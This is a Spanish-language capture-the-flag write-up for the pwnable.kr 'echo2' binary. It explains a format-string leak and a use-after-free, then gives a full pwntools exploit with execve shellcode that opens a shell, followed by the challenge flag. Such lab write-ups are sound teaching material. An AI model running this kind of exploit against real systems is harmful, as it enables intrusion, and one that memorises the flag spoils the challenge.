# echo2

<img width="132" height="176" alt="echo2" src="https://github.com/user-attachments/assets/f1f5a971-a01e-459f-b2e1-21ff6918a280" />

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

## FSB & UAF

La opción 2, "FSB echo", nos permite usar una vulnerabildad de cadena formateada.

La opción 3, "UAF echo", nos permite crear un chunk, escribir en el y luego lo libera.

A pesar de que la variable global `o` apunta a un chunk reservado con `malloc(0x28)` y los chunks de la opción 3 son reservados con `malloc(0x20)`, `malloc` internamente los crea de tamaño 0x30 a ambos.

Hay un bug en el código que permiter liberar `o` antes de que se confirme que se desea salir del programa:
``` C
do {
    while( true ) {
      while( true ) {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        ctx = (EVP_PKEY_CTX *)&DAT_00400c78_%d;
        __isoc99_scanf(&DAT_00400c78_%d,&input);
        getchar();
        if (3 < input) break;
        (**(code **)(func + (ulong)(input - 1) * 8))();
      }
      if (input == 4) break;
      puts("invalid menu");
    }
    cleanup(ctx);                                      <--- free(o)
    printf("Are you sure you want to exit? (y/n)");    <--- ¿Preguntar después?
    input = getchar();
  } while (input != 0x79);
```

Explotación:
  1. El programa tiene una pila ejecutable y los 24 bytes de `username` son suficientes para introducir shellcode.
  2. Filtrar una dirección de la pila y calcular la dirección donde se almacena nuestro shellcode.
  3. Liberar `o` y luego usar la opción 2 lleva a un Use After Free, con el que podemos sobreescribir `o+0x18`, la función `gretings` con la dirección del shellcode.

## Exploit
```py
#!/usr/bin/env python3
from pwn import *

elf = ELF("./echo2")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "pwnable.kr"
port = 9011

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
        # you need r.interactive() !
    else:
        return process([elf.path])
r = start()

# rop = ROP(elf)
# rop = ROP(elf, libc)
# rop = ROP(elf, libc, ld)

#========= exploit here ===================
# http://shell-storm.org/shellcode/files/shellcode-909.html
sc = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54" \
     b"\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"

# Put shellcode
r.sendlineafter(b":",sc)

# Leak a stack address (FSB echo)
r.sendlineafter(b">",b"2")
r.sendlineafter(b"\n",b"%10$p")
sc_address = int(r.recvline().strip(),16) - 0x20
r.info("Shellcode address: " +  hex(sc_address))

# Free o
r.sendlineafter(b">",b"4")
r.sendlineafter(b"(y/n)",b"n")

# Overwrite o[3] -> greetings (UAF echo)
r.sendlineafter(b">",b"3")
r.sendlineafter(b"\n",b"A"*24 + p64(sc_address))

# Shell
r.sendline(b"1")
r.interactive()
```

`w3_want_ex3cutable_5tack`
